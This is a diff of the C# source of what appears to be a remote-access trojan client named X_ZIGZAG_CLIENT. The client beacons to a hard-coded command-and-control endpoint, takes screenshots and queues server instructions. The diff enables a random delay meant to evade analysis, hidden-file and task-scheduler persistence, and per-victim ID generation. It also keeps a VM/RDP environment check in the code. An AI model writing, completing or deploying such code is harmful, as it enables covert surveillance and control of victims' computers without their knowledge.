@@ -10,9 +10,6 @@ using System.Text;
 using System.Net;
 using System.Collections.Generic;
 using System.Runtime.Serialization;
-using System.Linq;
-using System.Drawing;
-
 namespace X_ZIGZAG_CLIENT
 {
     public class Instruction
@@ -56,21 +53,20 @@ namespace X_ZIGZAG_CLIENT
         static string EndPoint = "http://192.168.1.17:4343/";
         static int DelayDuration = 30000;
         static int Screenshots = 0;
-        static bool keepDoing = true;
         [STAThread]
         static async Task Main()
         {
             // Sleep for a random time
-            //  Thread.Sleep(new Random().Next(20_000, 60_000));
+            Thread.Sleep(new Random().Next(20_000, 60_000));
             // Basic Check if VM/VPS/RDP/SERVER + Proxy
             if (await EnvironmentChecker.IsRunningInVM())
             {
                 //       Environment.Exit(0);
             }
             // Hide The File + Basic Setup Task Scheduler
-            // SetupHandler.Start();
+            SetupHandler.Start();
             // Generate UUID
-            uuid = "e917501e49cd2cd5e354faae3d04e2fce6794f7502e132709c9dd12f07b956cf";
+            uuid = GenerateUUID();
             // Login || SignUp
             Login();
             // Start Screenshot Handler
@@ -231,7 +227,6 @@ namespace X_ZIGZAG_CLIENT
                                     {
                                         lock (instructionsQueueLock)
                                         {
-
                                             instructionsQueue.Enqueue(inst);
                                         }
                                     }
